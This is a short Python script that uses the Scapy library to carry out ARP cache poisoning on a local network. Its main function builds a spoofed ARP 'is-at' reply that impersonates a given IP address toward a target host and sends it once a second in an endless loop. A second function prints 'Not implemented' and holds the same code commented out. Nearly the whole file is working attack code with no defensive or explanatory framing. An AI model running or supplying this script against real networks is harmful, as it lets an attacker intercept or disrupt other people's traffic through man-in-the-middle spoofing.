import sys
import time
from scapy.all import sendp, ARP, Ether


def grat_arp_poison(iface, target_ip, fake_ip):   
    print("Gratuitous ARP cache poisoning:")
    ethernet = Ether()
    arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
    packet = ethernet / arp
    while True:
        print("Sending poisoned arp reply packet")
        sendp(packet , iface=iface)
        time.sleep(1)

def callback_arp_poison(iface, target_ip, fake_ip):   
    print("Callback ARP cache poisoning: Not implemented")
#    ethernet = Ether()
#    arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
#    packet = ethernet / arp
#    while True:
#        sendp(packet , iface=iface)
#        time.sleep(1)
